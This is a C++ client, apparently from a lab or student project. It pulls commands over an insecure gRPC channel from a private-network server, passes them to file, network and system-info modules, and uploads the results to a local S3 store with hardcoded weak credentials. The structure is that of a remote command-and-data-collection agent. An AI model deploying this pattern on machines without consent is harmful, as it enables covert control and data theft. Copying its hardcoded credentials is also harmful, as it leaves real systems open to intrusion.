#include <iostream>
#include <memory>
#include <string>
#include <fstream>
#include <grpcpp/grpcpp.h>
#include "com.grpc.pb.h"
#include <Windows.h>
#include <winsock2.h>
#include <fstream>
#include <vector>

#include <aws/core/Aws.h>
#include <aws/core/auth/AWSCredentialsProvider.h>
#include <aws/core/client/ClientConfiguration.h>
#include <aws/s3/S3Client.h>
#include <aws/s3/model/PutObjectRequest.h>
#include <aws/core/utils/Outcome.h>

#include "NetworkModule.h"
#include "SystemInfoModule.h"
#include "FilesModule.h"

#include <format>

class CommandClient {
public:
    CommandClient(std::shared_ptr<grpc::Channel> channel) : stub_(com::ComService::NewStub(channel)) {}

    std::string GetCommand() {
        com::Empty Request;
        com::ComResponse Reply;
        grpc::ClientContext Context;

        grpc::Status Status = stub_->GetCommand(&Context, Request, &Reply);
        if (Status.ok()) {
            return Reply.com();
        }
        else {
            std::cout << "RPC Error: " << Status.error_message() << std::endl;
            return "RPC Error";
        }
    }

    void SendResponse(const std::string& resp) {
        com::Response request;
        request.set_resp(resp);
        com::Empty reply;
        grpc::ClientContext context;

        grpc::Status status = stub_->SendResponse(&context, request, &reply);
        if (!status.ok()) {
            std::cout << "RPC Error: " << status.error_message() << std::endl;
        }
    }

private:
    std::unique_ptr<com::ComService::Stub> stub_;
};

class CommandServer {
public:
    std::vector<std::unique_ptr<Module1>> modul;

    CommandServer() {
        modul.push_back(std::make_unique<Files>());
        modul.push_back(std::make_unique<Network>());
        modul.push_back(std::make_unique<SystemInfo>());
    }

    std::string MyUploadS3(std::string dataCommand, std::string nameObject) {
        std::ofstream Report("C:/Users/Kirill/source/Work2/MainClient/data.txt", std::ios_base::binary);
        if (!Report.is_open()) {
            std::cerr << "Error opening file for writing." << std::endl;
            exit(1);
        }
        Report.write(dataCommand.c_str(), dataCommand.size());
        if (Report.fail()) {
            std::cerr << "Error writing to file." << std::endl;
            Report.close();
            exit(1);
        }
        Report.close();

        Aws::SDKOptions options;
        Aws::InitAPI(options);
        {
            //Конфигурация клиента
            Aws::Client::ClientConfiguration Config;
            Config.scheme = Aws::Http::Scheme::HTTP;
            Config.endpointOverride = "localhost:9000";
            Aws::Auth::AWSCredentials credentials("qwerty123", "qwerty1234");
            Aws::S3::S3Client s3_client(credentials, Config, Aws::Client::AWSAuthV4Signer::PayloadSigningPolicy::Never, false);

            //Запрос
            Aws::S3::Model::PutObjectRequest Request;
            Request.SetBucket("mybucket");
            Request.SetKey(nameObject);
            auto data = Aws::MakeShared<Aws::FStream>("SampleAllocationTag", "C:/Users/Kirill/source/Work2/MainClient/data.txt", std::ios_base::in | std::ios_base::binary);
            Request.SetBody(data);

            //Отправка запроса
            auto Send = s3_client.PutObject(Request);
            if (Send.IsSuccess()) {
                std::cout << "File uploaded successfully!" << std::endl;
                std::string fileUrl = "http://localhost:9000/mybucket/" + nameObject;
                return fileUrl;
            }
            else {
                std::cout << "Error uploading file " << std::endl;
                return "Error uploading file ";
            }
        }
        Aws::ShutdownAPI(options);
    }

    void ProcessCommand(const std::string& command, CommandClient& client) {
        for (auto& module : modul) {
            std::string responce = module->Command(command);
            responce = module->Command(command);

            if (responce != "Unknown") {
                if (responce != "" && command != "") {
                    std::string Url = MyUploadS3(responce, command + "Command");
                    client.SendResponse(Url);
                }

            }
        }
    }
};

std::queue<std::string> commandQueue;
std::mutex MyMutex;
std::condition_variable queueWait;

void ProcessModule(CommandClient& client, CommandServer& server) {
    while (true) {
        std::unique_lock<std::mutex> lock(MyMutex);
        queueWait.wait(lock, [] { return !commandQueue.empty(); });
        std::string command = std::move(commandQueue.front());
        commandQueue.pop();
        lock.unlock();
        server.ProcessCommand(command, client);
    }
}

int main(int argc, char** argv) {
    std::string target_str = "192.168.44.130:50051";
    CommandClient client(grpc::CreateChannel(target_str, grpc::InsecureChannelCredentials()));
    CommandServer server;

    std::thread fileThread(ProcessModule, std::ref(client), std::ref(server));
    std::thread networkThread(ProcessModule, std::ref(client), std::ref(server));
    std::thread systemInfoThread(ProcessModule, std::ref(client), std::ref(server));

    while (true) {
        std::string command = client.GetCommand();
        {
            std::lock_guard<std::mutex> lock(MyMutex);
            commandQueue.push(command);
        }
        queueWait.notify_all();
    }

    fileThread.join();
    networkThread.join();
    systemInfoThread.join();

    return 0;
}
